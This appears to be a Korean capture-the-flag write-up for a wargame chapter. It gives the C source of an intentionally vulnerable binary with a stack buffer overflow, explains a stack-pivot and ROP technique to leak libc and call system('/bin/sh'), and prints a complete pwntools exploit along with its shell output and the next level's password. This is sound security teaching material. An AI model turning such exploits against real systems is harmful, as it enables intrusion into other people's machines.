https://github.com/hspace-io/Space_Alone/blob/main/problems/Chapter09/ch9.c
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int loop = 0;

void init(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
}

void gadget() {
    asm("pop %rdi; ret");
    asm("pop %rsi; pop %r15; ret");
    asm("pop %rdx; ret");
}


int main(void)
{
    init();
    char buf[0x30];
        
    printf("Hello, Sir\n");
    printf("This laboratory is currently closed.\n");
    printf("Please leave a message, and I will forward it to the person in charge of the laboratory.\n");
                
    if (loop)
    {
        puts("Goobye, Sir");
        exit(-1);
    }
    loop = 1;

    read(0, buf, 0x70);
    return 0;
}
```

```
[*] '/home/On_the_Edge_of_Time/pivot'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

main 함수에서 buf의 크기가 0x30인데, 입력을 0x70 길이만큼 받으므로 Stack-based Buffer Overflow가 발생한다.  
그러나 이번엔 loop 검증으로 인해 다시 main을 호출하여 쓸 수는 없다.  
Shell을 획득하는데 필요한 libc 주소를 구해야 하기 때문에 main 함수에서의 입력받는 부분을 다시 호출해야 한다.  
이때 스택 주소에 대한 정보는 따로 구해야 하기 때문에 귀찮아진다.  
바이너리가 No PIE이기 때문에, 여기서 Stack Pivot을 고민해볼 수 있다.  
ELF 형식의 바이너리에서는 BSS 영역에 쓰기 권한이 존재하기 때문에, Saved RBP를 BSS 영역으로 변조하여 BSS에다가 ROP 체인을 작성하고,  
BSS로 RSP를 옮겨 작성한 ROP 체인이 실행되게 하면 된다.  

우선 libc 주소를 알아내야 하기 때문에, 이미 호출된 setvbuf의 GOT 영역을 인자로 해서 puts를 호출하고, main의 read 부분으로 RIP를 옮긴다.  
이때, Saved RBP를 적당히 BSS + 0xd00으로 설정하면, 해당 주소를 기준으로 read를 통한 사용자 입력값이 적히게 된다.  
여기서 Overflow가 발생한다는 점을 고려하여 리턴 주소 자리에 ROP 체인을 작성하면 Shell을 획득할 수 있게 된다.  

익스플로잇은 아래와 같다:
```
from pwn import *

p = process('./pivot')
elf = ELF('./pivot', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

pop_rdi = 0x4011e5
pop_rsi_r15 = 0x4011e7
pop_rdx = 0x4011eb

read_of_main = 0x401260
leave_ret = 0x40127b

payload = b'A' * 0x30
payload += p64(0x404d00)
payload += p64(pop_rdi) + p64(elf.got['setvbuf'])
payload += p64(elf.plt['puts'])
payload += p64(read_of_main)

p.send(payload)

p.recvuntil(b"Please leave a message, and I will forward it to the person in charge of the laboratory.\n")
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['setvbuf']
print(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b"/bin/sh"))

ROP = b'A' * 0x30
ROP += p64(0x404d00)
ROP += p64(pop_rdi) + p64(binsh)
ROP += p64(pop_rdi + 1) + p64(system)

p.send(ROP)

p.interactive()
```

위의 익스플로잇을 사용하여 Shell을 획득하고, status 명령어로 마지막 챕터인 Chapter 10 유저의 PW를 확인한다.
```
On_the_Edge_of_Time@hsapce-io:~$ python3 expl.py
[+] Starting local process './pivot': pid 5677
0x7f0149dcc000
[*] Switching to interactive mode

$ status
UID: 510
Chapter10 PW: bss_is_useful
■□□□□□□□□□
$
```
